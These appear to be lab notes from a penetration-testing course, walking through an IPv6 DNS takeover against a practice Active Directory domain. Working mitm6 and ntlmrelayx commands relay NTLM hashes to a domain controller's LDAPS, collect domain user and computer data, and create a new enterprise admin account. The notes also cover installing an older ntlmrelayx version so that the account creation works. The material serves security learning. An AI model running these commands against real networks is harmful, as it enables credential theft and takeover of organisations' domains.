Run our mitm6 DHCP server:
```bash
sudo python3 ~/git/mitm6/mitm6/mitm6.py -d MARVEL.local -i eth1
```
Output:
![[Pasted image 20240314111555.png]]

Run ntlmrelayx:
```bash
impacket-ntlmrelayx -6 -t ldaps://10.0.0.18 -wh fakewpad.MARVEL.local -l loot
```
Args:
`-6`: Listen on both IPv6 and IPv4
`-t`: Target to relay the credentials to
`-wh`: WPAD host. Enable serving a WPAD file for Proxy Authentication attack. We can specify a fake hostname here since we control DNS via mitm6.
`-l`: Loot directory in which gathered loot such as SAM dumps will be stored

When we take a look at the *loot* folder, we can see that a lot of data was collected:
![[Pasted image 20240314111734.png]]

For example, if we open *domain_computers.html* in firefox we can see information about the computers:
![[Pasted image 20240314111926.png]]

The file *domain_users_by_group.html* contains interesting information about users:
![[Pasted image 20240314112453.png]]
- The users "SQL Server" and "Tony Start" never logged into their account (lastLogon). This could indicate that these are honeypot accounts.
- The password for the account "SQL Server" is present in the account description.

## Domain user account creation

Per default *impacket-ntlmrelayx* creates a domain user account via LDAP when a domain admin hash could be relayed. However, in our case this was not the case, apparently due to the ntlmrelayx version.
So I we had to use *pimpmykali* (https://github.com/Dewalt-arch/pimpmykali) in order to install an older version 0.9.19 of ntlmrelayx, where the account creation works.

mitm6 is also installed by *pimpmykali*, so we can run it like this:
```bash
sudo mitm6 -d MARVEL.local -i eth1
```

Run *ntlmrelayx.py* version 0.9.19:
```bash
ntlmrelayx.py -6 -t ldaps://10.0.0.18 -wh fakewpad.MARVEL.local -l loot2
```

When we login with a domain admin the NTLM hash is relayed and used to create a new user and add the user the the enterprise admin group:
![[Pasted image 20240314165147.png]]
![[Pasted image 20240314165051.png]]

When we check the users on the DC (refresh), we can see the newly created user:
![[Pasted image 20240314164603.png]]